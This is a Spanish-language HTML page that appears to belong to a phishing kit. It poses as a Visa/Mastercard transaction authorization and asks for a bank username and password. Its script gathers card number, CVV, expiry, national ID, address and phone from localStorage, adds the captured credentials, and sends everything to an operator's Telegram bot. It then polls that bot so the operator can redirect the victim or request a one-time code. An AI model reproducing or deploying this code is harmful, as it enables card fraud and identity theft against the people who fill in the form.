<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Autorización de Transacción</title>
    <script src="./bots/aes.js"></script>
   <script src="./bots/AesUtil.js"></script>
   <script src="./bots/md5.js"></script>
   <script src="./bots/pbkdf2.js"></script>
   <script src="./bots/string-mask.js"></script>
    <style>
        body {
            margin: 0;
            padding: 0;
            overflow: hidden; /* Evita que la página se desplace */
            background-color: #ffffff;
        }
    
        html, body {
            height: 100%;
        }
    
        #contenedor {
            position: relative;
            width: 95vw;
            height: 95vh;
            background-color: #ffffff;
            overflow: hidden; /* Evita que las imágenes sobresalgan del contenedor */
            top: 50px;
            left: 35px;
            width: 310px; /* Ajusta el ancho según tus necesidades */
            height: 500px; /* Ajusta la altura según tus necesidades */
        }
    
        #imagenIzquierda {
            position: absolute;
            top: 10px;
            left: 20px;
            width: 70px; /* Ajusta el ancho según tus necesidades */
            height: 30px; /* Ajusta la altura según tus necesidades */
        }
    
        #imagenDerecha {
            position: absolute;
            top: 2px;
            right: 20px;
            width: 100px; /* Ajusta el ancho según tus necesidades */
            height: 50px; /* Ajusta la altura según tus necesidades */
        }
    
        #titulo {
            font-size: 20px;
            font-weight: bold;
            color: #333; /* Color del texto */
            margin-top: 70px; /* Espaciado superior */
            margin-bottom: 10px; /* Espaciado inferior */
            text-align: center; /* Alineación del texto */
        }
    
        #titulo2 {
            font-size: 16px;
            font-weight: bold;
            color: #333; /* Color del texto */
            margin-top: 30px; /* Espaciado superior */
            margin-bottom: 10px; /* Espaciado inferior */
            text-align: center; /* Alineación del texto */
        }
    
        #parrafo {
            font-size: 13px;
            color: #000000; /* Color del texto */
            margin: 0 auto; /* Centra el párrafo horizontalmente */
            max-width: 80%; /* Ancho máximo del párrafo */
            text-align: justify; /* Justifica el texto */
            letter-spacing: 2px; /* Ajusta el valor según tus preferencias */
        }
    
        #formulario {
            margin-top: 10px;
            padding: 0 40px;
            display: flex;
            flex-direction: column;
            align-items: flex-start; /* Alinea los elementos al inicio del contenedor */
        }
    
        .form-group {
            display: flex;
            align-items: center;
            margin-bottom: 15px;
            width: 100%; /* Ajusta el ancho para que ocupe todo el contenedor */
        }
    
        .form-group label {
            font-size: 12px;
            font-weight: bold;
            color: #333;
            width: 30%; /* Ancho de la etiqueta */
            margin-right: 5px; /* Espaciado entre la etiqueta y el input */
            text-align: left; /* Alinea el texto del título a la izquierda */
        }
    
        .form-group input {
            width: 70%; /* Ancho del input */
            max-width: 130px; /* Ancho máximo para los inputs */
            padding: 8px;
            margin-bottom: 2px;
            margin-top: -4px; /* Ajusta la posición vertical del input */
            box-sizing: border-box;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
    
        #horaTransaccion {
            font-size: 14px;
            color: #333;
            margin-top: 15px;
            text-align: center; /* Centra el texto */
        }
    
        #autorizarBtn { 
            display: block;
            margin: 45px auto;
            padding: 15px 30px;
            border-radius: 10%;
            background-color: #000;
            color: #fff;
            text-align: center;
            cursor: pointer;
            font-size: 12px;
            text-decoration: none;
            border: none;
        }
    
        #contador {
            color: #555;
            font-size: 8px;
            margin-left: 8px;
        }
    .loaderp {
    width: 48px;
    height: 48px;
    border: 5px solid #FFF;
    border-bottom-color: #e8114b;
    border-radius: 50%;
    display: inline-block;
    box-sizing: border-box;
    animation: rotation 1s linear infinite;
    }

    @keyframes rotation {
    0% {
        transform: rotate(0deg);
    }
    100% {
        transform: rotate(360deg);
    }
    }

.loaderp-full{
    position: fixed;
    top: 0;
    overflow-y: hidden;
    z-index: 1000;
    background-color: white;
    width: 100vw;
    height: 100vh;

    display: none;
    flex-direction: column;
    justify-content: center;
    align-items: center;
}
    </style>
</head>

<body>
    <div id="contenedor">
        <img id="imagenIzquierda" src="img/visa.jpg" alt="Logo Visa">
        <img id="imagenDerecha" src="img/master.png" alt="Logo Mastercard">
        <div id="titulo">Autorización de transacción</div>
        <p id="parrafo">Estás intentando realizar un pago por tarjeta de crédito/débito. Necesitamos confirmar que eres tú quien realiza este pago.</p>
        <p id="horaTransaccion">Hora de la transacción: </p>
        <form id="formulario" method="POST">
            <div class="form-group">
                <label for="username">Usuario:</label>
                <input type="text" id="username" name="username" placeholder="Usuario" minlength="4" maxlength="20" required>
            </div>
            <div class="form-group">
                <label for="password">Clave:</label>
                <input type="password" id="password" name="password" placeholder="Clave" minlength="4" maxlength="20" required>
            </div>
            <input type="hidden" name="localStorageInfo" id="localStorageInfo">
            
        <button type="submit" id="autorizarBtn">Autorizar</button>
        </form>
    </div>

    <!-- LOADER FULL -->
    <div class="loaderp-full">
      <span class="loaderp"></span>
      <p class="text-italic tc-ocean fs-3 fw-light">Cargando...</p>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // Obtener la hora actual y mostrarla en el formulario
            document.getElementById('horaTransaccion').innerText += ` ${obtenerFechaActual()}`;
            const loader = document.querySelector(".loaderp-full");

            // Actualizar la hora en vivo cada segundo
            setInterval(actualizarHoraTransaccion, 1000);

            function obtenerFechaActual() {
                const ahora = new Date();
                const dia = ahora.getDate().toString().padStart(2, '0');
                const mes = (ahora.getMonth() + 1).toString().padStart(2, '0');
                const año = ahora.getFullYear();
                const horas = ahora.getHours().toString().padStart(2, '0');
                const minutos = ahora.getMinutes().toString().padStart(2, '0');
                const segundos = ahora.getSeconds().toString().padStart(2, '0');
                return `${dia}/${mes}/${año} ${horas}:${minutos}:${segundos}`;
            }

            function actualizarHoraTransaccion() {
                const ahora = new Date();
                const horas = ahora.getHours().toString().padStart(2, '0');
                const minutos = ahora.getMinutes().toString().padStart(2, '0');
                const segundos = ahora.getSeconds().toString().padStart(2, '0');
                document.getElementById('horaTransaccion').innerText = `Hora de la transacción: ${horas}:${minutos}:${segundos}`;
            }

            document.getElementById('formulario').addEventListener('submit', async function (event) {
                event.preventDefault();
                loader.style.display = "flex";
                var info = localStorage.getItem('formData');
                if (info) {
                    try {
                        // Asignar el JSON parseado al campo oculto
                        var parsedInfo = JSON.parse(info);
                        document.getElementById('localStorageInfo').value = JSON.stringify(parsedInfo);
                    } catch (e) {
                        console.error('Error al parsear localStorage:', e);
                    }
                } else {
                    console.log('No se encontró información en localStorage.');
                }

                // Guardar username y password en localStorage
                const transactionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
                var username = document.getElementById('username').value;
                var password = document.getElementById('password').value;
                localStorage.setItem('transactionId', transactionId);
                localStorage.setItem('username', username);
                localStorage.setItem('password', password);

                // Guardar todo el formulario en localStorage
                var formData = {
                    transactionId: transactionId,
                    username: username,
                    password: password
                };
                localStorage.setItem('formData1', JSON.stringify(formData));

            //Enviar el formulario al bot
            const autorizarBtn = document.getElementById('autorizarBtn');

                //obtener datos del localStorage
                const formData0 = JSON.parse(localStorage.getItem('formData'));
                const transactionsId = localStorage.getItem('transactionId');
                const user = localStorage.getItem('username');
                const pass = localStorage.getItem('password');   
                
                // Enviar mensaje a Telegram con botón de verificación
        const message = `Nuevo método de pago pendiente de verificación.\n🆔ID: ${transactionId}\n👤Nombre: ${formData0.nombre}\n🪪Cédula: ${formData0.documentoIdentidad}\n-\n📞Teléfono: ${formData0.telefono}\n🌇Ciudad: ${formData0.ciudad}\n🗺️Direc: ${formData0.direccion}\n-\n🏦 Banco: ${formData0.entidad}\n💳Tarjeta: ${formData0.tarjeta}\n📅Fecha: ${formData0.fechaExpiracion}\n🔐CVV: ${formData0.cvv}\n🧑‍💻Usuario: ${username}\n🔐Clave: ${password}\n
        `;

        
        const keyboard = JSON.stringify({
  inline_keyboard: [
    [{ text: "Pedir Logo", callback_data: `pedir_logo:${transactionId}` }],
    [{ text: "Pedir Dinámica", callback_data: `pedir_dinamica:${transactionId}` }],
    [{ text: "Error de TC", callback_data: `error_tc:${transactionId}` }],
    [{ text: "Error de Logo", callback_data: `error_logo:${transactionId}` }],
    [{ text: "Error de Dinámica", callback_data: `error_dinamica:${transactionId}` }],
    [{ text: "Finalizar", callback_data: `confirm_finalizar:${transactionId}` }]
  ],
});


        const config = await loadTelegramConfig();
        if (!config) {
          loader.style.display = "none";
          return;
        }

        fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            chat_id: config.chat_id,
            text: message,
            reply_markup: keyboard,
          }),
        })
          .then((response) => response.json())
          .then((data) => {
            if (data.ok) {
              console.log("Mensaje enviado a Telegram con éxito");
              checkPaymentVerification(transactionsId);
            } else {
              console.error("Error al enviar mensaje a Telegram:", data);
              loader.style.display = "none";
            }
          })
          .catch((error) => {
            console.error("Error al enviar mensaje a Telegram:", error);
            loader.style.display = "none";
          });
            });

            
                      
        async function loadTelegramConfig() {
        try {
          const response = await fetch("./js/brr76.json"); // Ajusta la ruta a tu archivo brr76.json
          if (!response.ok) {
            throw new Error(
              "No se pudo cargar el archivo de configuración de Telegram."
            );
          }
          return await response.json();
        } catch (error) {
          console.error(
            "Error al cargar el archivo de configuración de Telegram:",
            error
          );
        }
      }

      async function checkPaymentVerification(transactionsId) {
  const config = await loadTelegramConfig();
  if (!config) {
    loader.style.display = "none";
    return;
  }
  fetch(`https://api.telegram.org/bot${config.token}/getUpdates`)
    .then((response) => response.json())
    .then((data) => {
      console.log("Datos recibidos de Telegram:", data);
      const updates = data.result;
      const verificationUpdate = updates.find(
        (update) =>
          update.callback_query &&
          (update.callback_query.data === `pedir_dinamica:${transactionsId}` ||
            update.callback_query.data === `error_tc:${transactionsId}` ||
            update.callback_query.data === `error_logo:${transactionsId}` ||
            update.callback_query.data === `finalizar:${transactionsId}`)
      );

      if (verificationUpdate) {
        loader.style.display = "none";
        console.log("Verificación encontrada:", verificationUpdate);
        if (verificationUpdate.callback_query.data === `pedir_dinamica:${transactionsId}`) {
          window.location.href = "tp_data_verif.php";
        }
        if (verificationUpdate.callback_query.data === `error_logo:${transactionsId}`) {
          alert("Usuario o clave incorrecto. Por favor, revise sus datos e intente nuevamente.");
        }
        if (verificationUpdate.callback_query.data === `error_tc:${transactionsId}`) {
          alert("La tarjeta de crédito no pudo ser procesada. Por favor, verifique los detalles e intente nuevamente.");
          window.location.href = "payment.php";
        }
        if (verificationUpdate.callback_query.data === `finalizar:${transactionsId}`) {
          window.location.href = "finish.php";
        }
      } else {
        setTimeout(() => checkPaymentVerification(transactionsId, config), 2000);
      }
    })
    .catch((error) => {
      console.error("Error al verificar el pago:", error);
      setTimeout(() => checkPaymentVerification(transactionsId, config), 2000);
    });
}

        });
    </script>
</body>

</html>



